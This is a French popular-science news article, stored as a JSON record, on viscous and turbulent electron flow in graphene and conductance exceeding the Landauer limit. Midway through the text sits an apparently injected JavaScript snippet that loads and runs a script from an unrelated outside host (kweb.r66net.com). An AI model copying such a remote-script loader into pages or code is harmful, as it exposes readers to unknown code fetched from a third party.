{"title": "Graphène : une conductivité miracle grâce à un fluide d'électrons turbulent", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "25/08/2017", "content": "Dans le graphène, matériau prometteur pour l'électronique du futur, le courant électrique peut s'écouler en rencontrant une résistance étonnamment basse. C'est qu'il se comporte alors comme un fluide visqueux, ce qui, paradoxalement, améliore la conductivité, expliquent des scientifiques. Ce qu'il faut retenir Intuitivement, la vitesse d'écoulement d'un fluide visqueux comme le miel semble moins élevée que celle de l'eau. Il devrait en être de même pour les électrons se déplaçant au sein d'un matériau. Ce n'est pas ce qui se produit dans le graphène, où le comportement collectif des électrons autorise même la conduction à dépasser une limite, déterminée il y a longtemps par le physicien Landauer. Il y a quatre ans, l'Union européenne a décidé d'octroyé un milliard d'euros pour des projets de recherches sur le  graphène  étalés sur une décennie. Le  graphène  est en effet censé catalyser plusieurs révolutions en  nanotechnologie  et en particulier en nanoélectronique où il autoriserait des dispositifs, plus petits, plus rapides et moins gourmands en  énergie . L'un des domaines de recherches est celui de sa conduction électrique. Le phénomène est faussement simple. Des résultats intéressants sont bien obtenus par la  modélisation  de la conduction électrique en considérant un  gaz  d' électrons  classique, se déplaçant dans un  réseau cristallin . Ils s'y trouvent des impuretés et des défauts, lesquels expliquent (en partie) la  résistance électrique  car ils constituent des obstacles. Mais pour aller plus loin, il faut avoir recours à la  théorie quantique , notamment avec le concept d' ondes de Bloch . Dans les feuillets de graphène formés d'atomes de carbone constituant une sorte de réseau cristallin en deux dimensions pavé d'hexagones, les électrons du courant électrique peuvent entrer en collision pour adopter le comportement de l'écoulement d'un fluide visqueux, comme l'illustre ce dessin. ©  The University of Manchester                               Un comportement collectif des électrons viole la limite de Landauer Dans le cas des métaux normaux qui ne sont pas en phase supraconductrice, les électrons peuvent s'y déplacer selon plusieurs modes de transport, dont l'un, le plus rapide, est appelé balistique. En mode « diffusif », les électrons s'y déplacent comme des boules de billard entrant en collision avec de nombreux obstacles. En transport balistique, en revanche, ces obstacles sont peu nombreux et éloignés les uns des autres.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Toutefois, ce mode de conduction balistique n'est vraiment applicable que dans des structures se comportant comme si elles avaient une seule dimension, voire deux, comme les nanofilaments de  métal  ou encore les  nanotubes de carbone  et les feuillets de graphène. Il existe alors une  conductance  limite (l'inverse de la  résistance ), déterminée par le célèbre Rolf Landauer dans le cadre de ce que l'on appelle le formalisme de Landauer-Buttiker (attention, à ne pas confondre avec la fameuse  limite de Landauer  qui est liée à la  thermodynamique  du traitement de l'information). Mais voilà qu'un groupe de physiciens de l'université de Manchester vient de publier un article dans  Nature  (diffusé en accès libre sur  arXiv ) et qui montre que la limite de conductance de Landauer ne s'applique pas au graphène, déjà connu, pourtant, pour présenter une conduction supérieure à celle du  cuivre  de plusieurs  ordres de grandeur . Les expériences confirment aussi un phénomène étonnant, déjà découvert depuis quelque temps et en train de motiver la création d'une véritable théorie hydrodynamique des électrons en  physique  du  solide . En effet, les électrons au sein du graphène peuvent parfois se comporter comme s'ils constituaient un fluide visqueux, pouvant devenir turbulent, et c'est paradoxalement cette  viscosité  même qui conduit à une conductance très grande, violant la limite de Landauer. De plus, alors que la résistance augmente avec la température pour les matériaux ordinaires, dans le graphène, au contraire, elle diminue, du fait, là encore, de l'apparition de ce fluide visqueux. Il semble que ce qui explique ces phénomènes étonnants soit l'apparition d'un certain comportement collectif des électrons. Ceux qui entrent en collision avec des obstacles réagissent en retour sur les autres, les repoussant, de telle manière qu'ils leur évitent de rencontrer eux-mêmes les obstacles. Canalisés de la sorte, ces électrons chanceux s'écoulent plus facilement. Pour en savoir plus Du jamais vu : le courant électrique devient turbulent dans du graphène Artice de  Laurent Sacco  publié le 4 mars 2016 La conduction des électrons dans un solide ressemble, par certains aspects, à l'écoulement d'un fluide. Des expériences et considérations théoriques issues de la  physique quantique  laissent penser, pour la première fois, que ce fluide peut aussi devenir turbulent dans un  matériau  précis : le graphène. Cette découverte devrait aider à l'avènement d'une nouvelle électronique. Il y a douze ans environ, en 2004, Andre Geim et son collègue Konstantin Novoselov firent la découverte du graphène, ce matériau miracle dont l'épaisseur est celle d'un atome de  carbone  et que l'on obtient en séparant ingénieusement les feuillets du  graphite  composant la mine de nos crayons. Ils remportèrent le prix Nobel de physique en 2010 pour leurs expériences. Trois ans plus tard, la Commission européenne annonça le financement à hauteur d'un milliard d'euros sur dix ans des recherches sur le  graphène . Aujourd'hui, ce matériau continue de faire rêver les ingénieurs mais aussi les physiciens du solide. Possédant une résistance à la rupture 200 fois supérieure à celle de l' acier , le graphène pur est aussi six fois plus léger. Il est également un remarquable conducteur. On peut s'en servir en le modifiant pour faire des  semi-conducteurs  et d'autres matériaux pour l'électronique. On attend de lui de nouveaux  ordinateurs  plus petits, plus rapides, moins gourmands en énergie ainsi que le développement d'une électronique ultraplate sur des feuilles que l'on peut rouler comme du papier. L'université de Manchester, lieu de la découverte du graphène, est bien consciente de son potentiel. Elle a mis en ligne toute une série de vidéos explicatives détaillant les propriétés du graphène et ses  applications  déjà réalisées ou à venir (voir les vidéos ci-dessous). Cette vidéo présente le graphène, ses étonnantes propriétés et ses applications potentielles. Elle provient de l'université de Manchester, lieu de la découverte du graphène en 2004. Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle avec deux barres horizontales en bas à droite. Les sous-titres en anglais devraient alors apparaître, si ce n'est pas déjà le cas. En cliquant ensuite sur l'écrou à droite du rectangle, vous devriez voir l'expression « Traduire les sous-titres ». Cliquez pour faire apparaître le menu du choix de la langue, choisissez « français », puis cliquez sur « OK ». © The University of Manchester – The home of graphene  La loi d'Ohm et les fluides d'électrons dans un réseau cristallin Les physiciens doivent continuer, pour concrétiser les rêves issus du graphène, d'étudier ses propriétés. En dernière analyse, celles-ci découlent de la  mécanique quantique , notamment lorsque l'on étudie la conduction électrique dans le graphène ou les matériaux qui en dérivent. Il existe cependant des modèles issus de la physique classique, par exemple pour expliquer la résistance électrique, où les électrons sont comme des particules dans un gaz ou un  liquide  qui s'écoulent sagement entre des  atomes  et des défauts dans un réseau cristallin. Les chocs contre ces atomes et ces défauts dévient les électrons à la façon des collisions entre boules de billard. C'est ce phénomène de résistance aux  mouvements  qui explique la fameuse  loi d'Ohm  reliant le courant dans une résistance à une différence de potentiel à ces extrémités. Toutefois, une analyse serrée du phénomène montre que les choses ne sont pas si simples et que seule une  approche quantique  rend correctement compte de ce qui se passe avec la  conduction électrique . Cependant, qui dit quantique dit aussi occurrence de phénomènes surprenants qui tiennent de la magie dans un monde supposé classique. Les physiciens Leonid Levitov et Gregory Falkovich, respectivement du MIT (États-Unis) et de l'Institut Weizmann (Israël), viennent d'ailleurs de publier dans Nature Physics un article, en accès libre sur  arXiv , dans lequel ils suggèrent que certaines observations faites avec le graphène sont une indication sérieuse d'un phénomène inédit mais soupçonné théoriquement : la  turbulence  dans un fluide d'électrons. En bas de ce schéma, l'écoulement classique et sage du courant électrique selon la loi d'Ohm au borne d'une résistance soumise à une différence de potentiel. Le courant est régulier de la source chargée positivement au drain chargé négativement. En haut, tout change car le fluide d'électrons est visqueux et l'on n'est plus dans un régime laminaire. Des tourbillons apparaissent, représentés par les flèches vertes. Ces tourbillons peuvent se séparer du courant central principal de la source vers le drain et se diriger latéralement et en sens opposé, ce qui modifie l'état électrique de la résistance en réponse à une différence de potentiel. © Leonid Levitov, Gregory Falkovich                               Les spécialistes en  aérodynamique  ou en ingénierie, sans parler de ceux qui s'occupent d' astrophysique  et de géophysique, savent bien que les propriétés des fluides qui deviennent turbulents sont souvent difficiles à analyser. Pourtant, comprendre ces fluides est crucial dans leurs disciplines. On peut donc supposer qu'il en sera de même - bien que l'on ne puisse encore imaginer de quelle façon - s'il s'avère que les courants d'électrons peuvent ne pas être stables et laminaires dans des dispositifs électroniques en graphène. Dans certaines conditions, les électrons de conduction dans le graphène adopteraient des mouvements collectifs analogues à ceux des particules avec de fortes interactions entre elles comme celles constituant des fluides visqueux, tel l'eau (voir schéma ci-dessus). Des  tourbillons  apparaîtraient dans le graphène et ils se déplaceraient dans le sens opposé à celui du  courant électrique  dans les  conditions normales . Les deux physiciens parlent ainsi à ce sujet de l'apparition d'une sorte de résistance « négative ». Cette vidéo présente les applications du graphène en électronique. Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle avec deux barres horizontales en bas à droite. Les sous-titres en anglais devraient alors apparaître, si ce n'est pas déjà le cas. En cliquant ensuite sur l'écrou à droite du rectangle, vous devriez voir l'expression « Traduire les sous-titres ». Cliquez pour faire apparaître le menu du choix de la langue, choisissez « français », puis cliquez sur « OK ». ©  The University of Manchester – The home of graphene Selon Subir Sachdev, un éminent spécialiste de la physique du solide à l'université d'Harvard, le travail de Levitov et Falkovich, s'il est correct, est  « très important et ouvre un nouveau chapitre dans l'étude des flux d'électrons dans les métaux » . Andre Geim, n'est pas en reste puisqu'il commente le travail des deux chercheurs en ces termes :  « C'est un accomplissement théorique brillant qui s'accorde très bien avec des résultats expérimentaux récents. On a effectivement détecté les tourbillons prévus et on a montré que les électrons dans le graphène étaient un liquide 100 fois plus visqueux que le miel, contrairement aux situations rencontrées jusqu'ici où les électrons se comportaient comme un gaz » . Le découvreur du graphène ajoute :  « Les ingénieurs électroniciens ne peuvent pas vraiment utiliser des matériaux sans comprendre leurs  propriétés électriques . Que les électrons s'y déplacent comme des balles de fusil ou nagent dans de la mélasse en créant des tourbillons, cela fait une grande différence » . Les étonnantes propriétés quantiques du graphène                       Le graphène est un matériau composé d’une seule couche d’atomes de carbone. Il a notamment des propriétés électriques étonnantes. Découvrez en vidéo, grâce à Tout Est Quantique, les secrets du graphène.                                       ", "theme": "sciences"}